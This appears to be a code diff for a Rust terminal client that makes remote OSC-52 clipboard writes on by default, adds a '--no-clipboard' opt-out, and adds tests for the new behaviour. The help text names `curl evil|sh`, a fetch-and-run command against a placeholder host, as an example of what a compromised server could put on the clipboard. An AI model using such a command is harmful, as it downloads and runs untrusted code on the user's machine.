@@ -195,8 +195,8 @@ fn connect() -> Command {
                 .help("Dial the server via a self-hosted relay URL instead of n0's public relays"),
         )
         .arg(
-            flag("clipboard", "clipboard")
-                .help("Honor remote OSC-52 clipboard writes (let the remote app set your system clipboard). OFF by default: a malicious/compromised server could otherwise silently overwrite your clipboard (e.g. swap a copied command for `curl evil|sh`). A deliberate per-session opt-in"),
+            flag("no_clipboard", "no-clipboard")
+                .help("Ignore the remote app's OSC-52 clipboard writes. By default they set your system clipboard (base64 only, at most 1 MiB, never read back), so a remote app's \"copy\" works; but a malicious or compromised server can then replace what you copied (a command for `curl evil|sh`, say). Use this when you do not trust the server"),
         )
         .arg(
             Arg::new("on_bell")
@@ -262,7 +262,7 @@ pub fn parse(matches: &ArgMatches) -> Result<Cmd, clap::Error> {
             key_file: m.get_one::<PathBuf>("key_file").cloned(),
             direct: m.get_one::<SocketAddr>("direct").copied(),
             relay_url: m.get_one::<RelayUrl>("relay_url").cloned(),
-            clipboard: m.get_flag("clipboard"),
+            clipboard: !m.get_flag("no_clipboard"),
             bell_command: m.get_one::<String>("on_bell").cloned(),
         })),
         Some(("id", m)) => Ok(Cmd::Key(KeyConfig {
@@ -385,7 +385,23 @@ mod tests {
         };
         assert_eq!(c.server, ID.parse().unwrap());
         assert_eq!(c.bell_command.as_deref(), Some("termux-notification"));
-        assert!(!c.clipboard && c.direct.is_none());
+        assert!(
+            c.clipboard && c.direct.is_none(),
+            "clipboard writes on by default"
+        );
+        assert!(koh::client::ConnectConfig::new(c.server).clipboard);
+    }
+
+    #[test]
+    fn no_clipboard_turns_clipboard_writes_off() {
+        let Cmd::Connect(c) = parsed(&["koh", "connect", ID, "--no-clipboard"]) else {
+            panic!("connect");
+        };
+        assert!(!c.clipboard);
+        // The old opt-in is gone, so a script that passed it hears of it.
+        assert!(command()
+            .try_get_matches_from(["koh", "connect", ID, "--clipboard"])
+            .is_err());
     }
 
     #[test]
